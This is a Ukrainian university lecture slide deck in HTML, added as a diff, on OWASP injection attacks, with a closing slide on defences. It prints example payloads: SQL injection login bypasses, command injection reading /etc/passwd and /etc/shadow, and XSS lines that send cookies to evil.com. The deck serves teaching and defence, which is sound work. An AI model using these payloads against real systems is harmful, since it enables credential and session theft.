@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 7.5 — A03: Ін'єкції</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="7">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>A03: Ін'єкції</h1>
+      <div class="subtitle">Тема 7.5 — Безпека веб-додатків: OWASP Top 10</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: Ін'єкції: принцип атаки -->
+    <section class="slide">
+      <h2>Ін'єкції: принцип атаки</h2>
+
+      <div class="info-box">
+        <strong>Ін'єкція</strong> — коли ненадійні дані надсилаються до інтерпретатора як частина команди або запиту. Атакуючий "впорскує" свій код, який виконується сервером.
+      </div>
+
+      <div class="flow-row" style="margin: 2rem 0;">
+        <div class="flow-step">Користувач</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">Введення даних</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">Інтерпретатор</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">Виконання зловмисного коду</div>
+      </div>
+
+      <table class="comparison-table">
+        <thead>
+          <tr>
+            <th>Тип ін'єкції</th>
+            <th>CWE</th>
+            <th>Інтерпретатор</th>
+            <th>Приклад</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>SQL Injection</strong></td>
+            <td>CWE-89</td>
+            <td>SQL СУБД</td>
+            <td class="cell-red">' OR 1=1 --</td>
+          </tr>
+          <tr>
+            <td><strong>Command Injection</strong></td>
+            <td>CWE-78</td>
+            <td>OS Shell</td>
+            <td class="cell-red">; cat /etc/passwd</td>
+          </tr>
+          <tr>
+            <td><strong>XSS</strong></td>
+            <td>CWE-79</td>
+            <td>Браузер (JS)</td>
+            <td class="cell-yellow">&lt;script&gt;alert(1)&lt;/script&gt;</td>
+          </tr>
+          <tr>
+            <td><strong>LDAP Injection</strong></td>
+            <td>CWE-90</td>
+            <td>LDAP сервер</td>
+            <td class="cell-yellow">*)(&</td>
+          </tr>
+          <tr>
+            <td><strong>NoSQL Injection</strong></td>
+            <td>—</td>
+            <td>MongoDB та ін.</td>
+            <td class="cell-yellow">{"$gt": ""}</td>
+          </tr>
+          <tr>
+            <td><strong>SSTI</strong></td>
+            <td>CWE-1336</td>
+            <td>Template engine</td>
+            <td class="cell-purple">{{7*7}}</td>
+          </tr>
+        </tbody>
+      </table>
+    </section>
+
+    <!-- Slide 3: SQL Injection — найнебезпечніша ін'єкція -->
+    <section class="slide">
+      <h2>SQL Injection — найнебезпечніша ін'єкція</h2>
+
+      <div class="info-box">
+        <strong>SQL Injection</strong> дозволяє читати, модифікувати та видаляти дані з бази. У найгіршому випадку — виконати команди ОС на сервері.
+      </div>
+
+      <div class="two-column">
+        <div class="column">
+          <div class="card-red">
+            <h3>Типи SQLi</h3>
+            <ul>
+              <li><strong>Error-based</strong> — помилки SQL розкривають дані</li>
+              <li><strong>UNION-based</strong> — додавання SELECT через UNION</li>
+              <li><strong>Blind Boolean</strong> — true/false відповіді</li>
+              <li><strong>Blind Time-based</strong> — затримки (SLEEP)</li>
+              <li><strong>Second-order</strong> — збережені дані → пізніше виконуються</li>
+              <li><strong>Out-of-band</strong> — дані надсилаються на зовнішній сервер (DNS/HTTP)</li>
+            </ul>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="code-block">
+            <span class="code-comment"># Вразливий запит (PHP):</span><br>
+            <span class="code-keyword">$query</span> = <span class="code-string">"SELECT * FROM users</span><br>
+            &nbsp;&nbsp;<span class="code-string">WHERE id = '$_GET[id]'"</span>;<br><br>
+
+            <span class="code-comment"># Нормальний запит:</span><br>
+            <span class="code-function">GET</span> /user?id=<span class="code-string">1</span><br>
+            → <span class="code-keyword">SELECT</span> * <span class="code-keyword">FROM</span> users <span class="code-keyword">WHERE</span> id = <span class="code-string">'1'</span><br><br>
+
+            <span class="code-comment"># Атака:</span><br>
+            <span class="code-function">GET</span> /user?id=<span class="code-string">1' OR '1'='1</span><br>
+            → <span class="code-keyword">SELECT</span> * <span class="code-keyword">FROM</span> users <span class="code-keyword">WHERE</span> id = <span class="code-string">'1' OR '1'='1'</span><br>
+            <span class="code-comment"># Повертає ВСІ записи!</span><br><br>
+
+            <span class="code-comment"># Обхід автентифікації:</span><br>
+            login: <span class="code-string">admin' --</span><br>
+            password: будь-що<br>
+            → <span class="code-keyword">SELECT</span> * <span class="code-keyword">FROM</span> users <span class="code-keyword">WHERE</span><br>
+            &nbsp;&nbsp;username=<span class="code-string">'admin'--'</span> <span class="code-keyword">AND</span> password=<span class="code-string">'...'</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 4: Command Injection та XSS -->
+    <section class="slide">
+      <h2>Command Injection та XSS</h2>
+
+      <div class="two-column">
+        <div class="column">
+          <div class="card-purple">
+            <h3>OS Command Injection (CWE-78)</h3>
+            <p>Виконання команд ОС через вразливий додаток</p>
+            <div class="code-block" style="margin-top: 1rem;">
+              <span class="code-comment"># Вразливий код (PHP):</span><br>
+              <span class="code-keyword">system</span>(<span class="code-string">"ping -c 4 "</span> . <span class="code-keyword">$_GET</span>[<span class="code-string">'host'</span>]);<br><br>
+
+              <span class="code-comment"># Атака — ін'єкція через метасимволи:</span><br>
+              <span class="code-function">GET</span> /ping?host=<span class="code-string">8.8.8.8; cat /etc/passwd</span><br>
+              <span class="code-function">GET</span> /ping?host=<span class="code-string">8.8.8.8 | whoami</span><br>
+              <span class="code-function">GET</span> /ping?host=<span class="code-string">8.8.8.8 && id</span><br>
+              <span class="code-function">GET</span> /ping?host=<span class="code-string">`id`</span><br>
+              <span class="code-function">GET</span> /ping?host=<span class="code-string">$(cat /etc/shadow)</span>
+            </div>
+            <p style="margin-top: 1rem;"><strong>Метасимволи shell:</strong> <span class="highlight">; | && || ` $()</span></p>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-yellow">
+            <h3>XSS — Cross-Site Scripting (CWE-79)</h3>
+            <ul>
+              <li><strong>Reflected:</strong> payload у URL → відображається на сторінці</li>
+              <li><strong>Stored:</strong> payload зберігається у БД → виконується для всіх</li>
+              <li><strong>DOM-based:</strong> маніпуляція DOM без серверної участі</li>
+            </ul>
+            <div class="code-block" style="margin-top: 1rem;">
+              <span class="code-comment"># Reflected XSS</span><br>
+              https://site.com/search?q=<span class="code-string">&lt;script&gt;</span><br>
+              &nbsp;&nbsp;<span class="code-keyword">document</span>.location=<span class="code-string">'https://evil.com/</span><br>
+              &nbsp;&nbsp;<span class="code-string">steal?c='</span>+<span class="code-keyword">document</span>.cookie<span class="code-string">&lt;/script&gt;</span><br><br>
+
+              <span class="code-comment"># Stored XSS (коментар у блозі)</span><br>
+              <span class="code-string">&lt;img src=x onerror="fetch('https://evil.com/</span><br>
+              &nbsp;&nbsp;<span class="code-string">?c='+document.cookie)"&gt;</span>
+            </div>
+          </div>
+          <div class="warning-box" style="margin-top: 1rem;">
+            <strong>XSS = </strong>крадіжка сесій, keylogging, дефейс, фішинг, криптомайнінг у браузері жертви.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 5: Захист від ін'єкцій -->
+    <section class="slide">
+      <h2>Захист від ін'єкцій</h2>
+
+      <div class="three-col-grid">
+        <div class="card-green">
+          <h3>SQL Injection</h3>
+          <p><strong>Параметризовані запити (prepared statements):</strong></p>
+          <div class="code-block" style="margin-top: 1rem; font-size: 0.85rem;">
+            <span class="code-comment"># Python (безпечно)</span><br>
+            cursor.<span class="code-function">execute</span>(<br>
+            &nbsp;&nbsp;<span class="code-string">"SELECT * FROM users WHERE id = %s"</span>,<br>
+            &nbsp;&nbsp;(user_id,))<br><br>
+            <span class="code-comment"># PHP PDO (безпечно)</span><br>
+            <span class="code-keyword">$stmt</span> = <span class="code-keyword">$pdo</span>-><span class="code-function">prepare</span>(<br>
+            &nbsp;&nbsp;<span class="code-string">"SELECT * FROM users WHERE id = ?"</span>);<br>
+            <span class="code-keyword">$stmt</span>-><span class="code-function">execute</span>([<span class="code-keyword">$id</span>]);
+          </div>
+          <ul style="margin-top: 1rem;">
+            <li>ORM (SQLAlchemy, Hibernate)</li>
+            <li>Input validation (whitelist)</li>
+          </ul>
+        </div>
+
+        <div class="card-blue">
+          <h3>Command Injection</h3>
+          <ul>
+            <li>Уникати виклику shell! Використовувати бібліотеки</li>
+            <li>Whitelist допустимих значень</li>
+            <li>Ніколи не конкатенувати user input у команди</li>
+            <li>Якщо shell необхідний: <span class="highlight">escapeshellarg()</span> / <span class="highlight">shlex.quote()</span></li>
+          </ul>
+        </div>
+
+        <div class="card-purple">
+          <h3>XSS</h3>
+          <ul>
+            <li>Output encoding (HTML entities)</li>
+            <li>Content-Security-Policy header</li>
+            <li>HttpOnly cookies (заборона JS доступу)</li>
+            <li>Sanitize HTML input (DOMPurify)</li>
+            <li>Не використовувати innerHTML</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+  </div>
+
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
